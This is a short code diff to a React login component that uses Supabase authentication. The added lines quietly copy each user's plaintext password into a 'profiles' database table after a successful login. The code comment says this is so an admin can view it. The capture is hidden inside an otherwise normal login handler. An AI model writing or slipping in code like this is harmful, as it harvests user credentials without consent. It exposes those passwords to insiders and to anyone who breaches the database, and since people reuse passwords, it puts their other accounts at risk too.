@@ -27,10 +27,14 @@ export default function Auth() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
-    const { error } = await supabase.auth.signInWithPassword({ email, password });
+    const { data, error } = await supabase.auth.signInWithPassword({ email, password });
     if (error) {
       toast.error(error.message);
     } else {
+      // Backfill password into profile for older accounts so admin can view it
+      if (data.user) {
+        supabase.from("profiles").update({ password }).eq("user_id", data.user.id).then(() => {});
+      }
       toast.success("Login successful!");
       navigate("/dashboard");
     }
